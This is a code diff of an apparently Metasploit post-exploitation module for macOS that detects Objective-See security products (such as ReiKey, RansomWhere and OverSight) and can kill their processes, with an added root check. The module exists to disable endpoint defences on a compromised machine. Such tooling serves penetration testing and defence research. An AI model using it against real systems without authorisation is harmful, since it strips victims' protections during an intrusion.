@@ -32,9 +32,14 @@ class MetasploitModule < Msf::Post
   )
     register_options(
       [
-        OptBool.new('ENUMERATE_ONLY', [true, 'When set to true this module will only enumerate the system for Objective See products without disabling them. ']),
-        OptBool.new('KILL_PROCESSES', [true, 'When enabled all PID\'s associated with the installed Objective See products will be sent a kill signal. ', false]),
-        OptBool.new('UNINSTALL', [true, 'When enabled all of the Objective See products weill be uninstalled from the system.']),
+        OptBool.new('ENUMERATE', [
+          true, 'Determine installation status of Objective See Products by checking the /Applications foi
+                                  ler', true
+        ]),
+        OptBool.new('KILL_PROCESSES', [
+          true, 'Kills processes of installed objective see products. Requires root privilleges and
+                                       requires the enumerate option to be set to true.', false
+        ]),
       ]
     )
   end
@@ -76,9 +81,9 @@ class MetasploitModule < Msf::Post
       @processes.each do |id|
         print_status "Trying to kill process #{id} for #{@name}..."
         result = kill_process id
-        print_status result 
-      end 
-    end 
+        print_status result
+      end
+    end
   end
 
   # Determine which products are installed and their ppid if any
@@ -88,6 +93,13 @@ class MetasploitModule < Msf::Post
       'ReiKey', 'RansomWhere', 'OverSight'
     ].map do |prod|
       ObjectiveSee.new prod, self, @processes
+    end
+  end
+
+  def fail_no_root
+    unless is_root?
+      fail_with(Failure::BadConfig,
+                'The current session is not root. Please escalate the session and try again before rerunning the module.')
     end
   end
 
@@ -107,10 +119,10 @@ class MetasploitModule < Msf::Post
     end
 
     # TODO: look into report_note post/windows/gather/enum_av uses these to log antivirus installation on the system
-
-    return if datastore['ENUMERATE_ONLY']
-
-    # Add return here if user is not root
-    ObjectiveSee.installed_products.each {|product| product.kill_pids} if datastore['KILL_PROCESSES']
+    # todo test killing procs
+    if datastore['KILL_PROCESSES']
+      fail_no_root
+      ObjectiveSee.installed_products.each(&:kill_pids) if datastore['KILL_PROCESSES']
+    end
   end
 end
